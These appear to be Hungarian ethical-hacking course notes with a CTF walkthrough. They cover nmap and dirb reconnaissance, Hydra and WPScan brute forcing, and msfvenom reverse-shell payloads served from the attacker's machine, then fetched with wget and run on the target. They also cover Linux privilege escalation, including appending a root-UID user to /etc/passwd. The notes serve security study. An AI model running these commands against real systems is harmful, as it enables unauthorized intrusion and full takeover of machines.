# Etikus Hackelés Jegyzet

*Eredeti jegyzet: Saját, bővítve és rendszerezve ChatGPT segítségével*

---

## Tartalomjegyzék

1. [Nmap - Portszkennelés](#nmap---portszkennelés)
2. [HTTP Protokoll és Webes Feltérképezés](#http-protokoll-és-webes-feltérképezés)
3. [Hydra - Brute Force Jelszótörés](#hydra--brute-force-jelszótörés)
4. [Reverse / Bind Shell Technika](#reverse--bind-shell-technika)
5. [Netcat Opcók](#netcat-opcók)
6. [Stabilabb Shell](#stabilabb-shell)
7. [CMD Shell Támadás](#cmd-shell-támadás)
8. [WordPress Támadások](#wordpress)
9. [Exploit Adatbázis](#exploit-adatbázis)
10. [Linux Privilege Escalation](#linux-privilege-escalation)
11. [Felhasználóváltás](#felhasználóváltás)
12. [/etc/passwd Manipulálása](#etcpasswd-manipulálása)
13. [LinPEAS](#linpeas)
14. [/etc/hosts Manipulálása](#etchosts-manipulálása)
15. [BurpSuite](#burpsuit)

---

## Nmap - Portszkennelés

* Alapértelmezés szerint az Nmap az 1000 leggyakoribb portot szkenneli, így gyakran nem kell megadni a `-p` kapcsolót.
* Alap szkennelés parancs:

```bash
ping <célszerver IP>
nmap -sS -sV <célszerver IP>
```

* `-sS`: TCP SYN szkennelés
* `-sV`: Szolgáltatásverzió felismerés

---

## HTTP Protokoll és Webes Feltérképezés

* Weboldal ellenőrzése: `http://<ip>`

### Almappák keresése

* **Dirb (CLI)**

```bash
dirb http://<ip> -r -u <felhasználónév>:<jelszó>
```

* **DirBuster (GUI)** - Java alapú, vizuális mappa feltérképező eszköz

### Szólisták

* Almappák, felhasználónevek: `/usr/share/wordlists/dirb/common.txt`
* Jelszavak: `/usr/share/wordlists/rockyou.txt`

---

## Hydra – Brute Force Jelszótörés

```bash
hydra -l <felhasználónév> -P <jelszólista> <ip> http-get
```

---

## Reverse / Bind Shell Technika

### Reverse Shell

1. Szabad port kiválasztása (pl. 4444)
2. Saját IP lekérdezése: `ip a`
3. Shellkód generálása (IP + port beágyazva)
4. Shellkód átjuttatása a célgépre
5. Listener indítása:

```bash
nc -lvnp 4444
```

6. Shellkód futtatása a célgépen

### Bind Shell

1. Port kiválasztása
2. Cél IP ismerete
3. Shellkód generálása
4. Shellkód átjuttatása
5. Kapcsolódás a célgépre:

```bash
nc <cél IP> <port>
```

---

## Netcat Opcók

* `-l`: Listen mód
* `-v`: Verbose (részletes)
* `-n`: Ne oldjon fel DNS-t (numeric only)
* `-p`: Port megadása

---

## Stabilabb Shell

* TTY emuláció:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

---

## CMD Shell Támadás (RCE)

* Input mezők vagy futtatható fájlok kódfuttatásra kihasználhatók lehetnek

### ELF fájl futtatása (Reverse Shell generálás)

1. Shell generálás (támadó gépen):

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<támadó IP> LPORT=4444 -f elf > shell.elf
```

2. Listener indítása:

```bash
nc -lvp 4444
```

3. HTTP szerver indítása fájl átvitelhez:

```bash
python3 -m http.server
```

4. Célgépen:

```bash
cd /tmp
rm -f shell.elf
wget http://<támadó IP>:8000/shell.elf
chmod +x shell.elf
./shell.elf
```

---

## WordPress

* WPScan használata:

```bash
wpscan --url http://<url> -e at,ap,u --usernames <felhasználó> --passwords <jelszólista>
```

* Exploit keresés Metasploit-ban:

```bash
msfconsole
search wordpress
use <exploit_id>
set options
run
```

---

## Exploit Adatbázis

* Közismert exploit gyűjtemény:
  [exploit-db.com](https://exploit-db.com)

---

## Linux Privilege Escalation

### 1. SUID Bitek keresése

```bash
find / -perm -u=s 2>/dev/null
```

* Használd a GTFObins oldalt a binárisok kihasználhatóságának ellenőrzésére: [https://gtfobins.github.io](https://gtfobins.github.io)

### 2. SSH Privát Kulcsok

* Ellenőrizendő elérési út:
  `/home/<user>/.ssh/`

* Bejelentkezés:

```bash
ssh -p <port> <felhasználó>@<ip>
```

* Privát kulccsal:

```bash
ssh -p <port> -i <kulcs_elérés> <felhasználó>@<ip>
```

### 3. Sudo Jogosultságok

```bash
sudo -l
```

### 4. /etc/passwd és /etc/shadow vizsgálata

* Jogosultságellenőrzés:

```bash
getfacl /etc/passwd
getfacl /etc/shadow
```

* Hash töréshez: `john`, `hashcat`

### 5. Python Library Hijacking

* Ha a script bízik a lokális importban (pl. `import random`), akkor tetszőleges kód is futtatható saját `random.py` létrehozásával.

---

## Felhasználóváltás

```bash
su <user>
sudo -u <user> <parancs>
```

---

## /etc/passwd Manipulálása

Ha írható a fájl, root joggal lehet belépni saját félhasználóval:

1. Hash generálás:

```bash
openssl passwd -5 korte
```

2. Sor hozzáadása:

```bash
echo 'hacker:$5$...:0:0:root:/root:/bin/bash' >> /etc/passwd
```

---

## LinPEAS

* Automatizált privilege escalation szkript:
  [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)

---

## /etc/hosts Manipulálása

1. Fájl szerkesztése:

```bash
sudo nano /etc/hosts
```

2. Sor hozzáadása:

```
<ip> <local domain>
```

---

## BurpSuit

* Futtatás CLI-ből:

```bash
burpsuite
```

* HTTP kérések elfogása, manipulálása, automatizált tesztelésre.

---

## Más jegyzetek

[Ballai László](https://docs.google.com/document/d/19Dlm0niGw4250nnIafraZiyRNUJ83Jl7wAHuJ7xKVec/edit?tab=t.0#heading=h.5qucosbyigcr)
[Sándor Martin](https://drive.google.com/drive/folders/1pAPH6c5MFAJhJIpG6w88XulvNG5qrfBm)
[Gyakorló videó 1](https://www.youtube.com/watch?v=mjCdsCnjMqY)
[Gyakorló videó 2](https://youtu.be/Zts_x4AP9rc)

# 🛠️ Beugró (CTF) Lépések – Apache + SSH + Reverse Shell

## 🔍 1. Portok keresése `nmap`-pel

```bash
nmap -p 10000-20000 <targetIP>
```

- Kapsz **két portot**: az egyik egy **Apache (web)**, a másik **SSH**.
- Teszteld őket böngészőben (http://<targetIP>:<port>):
  - Ami **weboldalt** ad vissza, az az **Apache**.
  - A másik az **SSH**.

> **Jegyezd fel**:  
> `Apache port = ...`  
> `SSH port = ...`

---

## 🌐 2. Webes feltérképezés `dirb`-bel

```bash
dirb http://<targetIP>:<apachePORT>
```

- Itt fogsz találni egy olyan oldalt, amin egy név és egy hash található.
- Egérrel **kijelölöd**, majd **jobb klikk → copy**.

---

## 🧾 3. Hash/Jelszó mentése kulcsfile-ba

```bash
nano key
```

- Beilleszted a vágólapról (jobb klikk → paste).
- Mentés: `Ctrl + X`, majd `Enter`, `Enter` ha újra kéri.

Ellenőrzés:

```bash
ls
chmod 600 key
ls -al
```

---

## 🔐 4. SSH belépés kulccsal

```bash
ssh -i ./key -p <SSH port> <felhasználónév>@<targetIP>
```

- Ha ez nem működik (pl. ha jelszót kaptál a hash helyett), akkor keress rá, hogyan lehet jelszóval SSH-zni:

```bash
ssh -p <SSH port> <felhasználónév>@<targetIP>
```

---

## 💣 5. Reverse shell létrehozása `msfvenom`-nal

Új terminált nyitsz, az előző SSH terminált nyitva hagyod:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<sajátIP> LPORT=<apachePORT> -o a.bin
python3 -m http.server <apachePORT>
```

- Böngészőbe:  
  `http://<sajátIP>:<apachePORT>`  
- Jobb klikk az `a.bin` fájlra → **Link másolása**.

---

## 📥 6. Payload letöltése targetre SSH-n keresztül

SSH terminálban:

```bash
wget <kimásolt link> -O /tmp/a
```

- Ha jól sikerült, a Python szerver terminálban látszik a letöltés.
- Zárd be a szervert:

```bash
Ctrl + C
```

---

## 🧲 7. Hallgatás netcattel

Python szerver terminál helyett most netcatet indítasz:

```bash
nc -lvnp <apachePORT>
```

---

## 🧨 8. Payload futtatása a targeten

Vissza SSH terminálra:

```bash
/tmp/a
```

- Ha mindent jól csináltál, **a netcat terminálban megjelenik a connection**.
- Megvan a **beugró**! 🎉

---

## 🧭 Rövid összefoglalás lépésekben

1. `nmap`-pel portkeresés (10000–20000)
2. `dirb`-bel feltérképezed a webet → név+hash
3. SSH kulcs/jelszó mentés, majd SSH login
4. `msfvenom`-nal reverse shell payload
5. `python3 -m http.server` a payload kiszolgálásához
6. `wget`-tel letöltés a targetre
7. `nc`-vel figyelés
8. Targeten a payload futtatása → reverse shell

---
